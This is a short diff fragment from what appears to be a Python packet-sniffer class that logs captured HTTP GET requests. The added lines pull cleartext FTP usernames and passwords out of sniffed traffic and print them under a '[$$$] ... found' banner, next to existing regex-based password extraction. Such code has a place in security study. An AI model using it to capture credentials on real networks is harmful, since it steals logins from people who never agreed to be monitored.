@@ -270,6 +270,14 @@ class Sniffer(object):
 					host = str(p[IP].dst)
 
 				print color("[TCP] ","white") + p[IP].src + " ---> "+ host +" - GET: " + get[0]
+			elif load.startswith('USER'):
+				method = load.split("USER")
+				user = str(method[1]).split("\r")
+				print "\n" + color("[$$$] FTP Login found: ","yellow") + ''.join(user) + "\n"
+			elif load.startswith('PASS'):
+				method = load.split("PASS")
+				passw = str(method[1]).split("\r")
+				print "\n" + color("[$$$] FTP Password found: ","yellow") + ''.join(passw) + "\n"
 			else:
 				users = re.findall(user_regex, load)
 				passwords = re.findall(pw_regex, load)
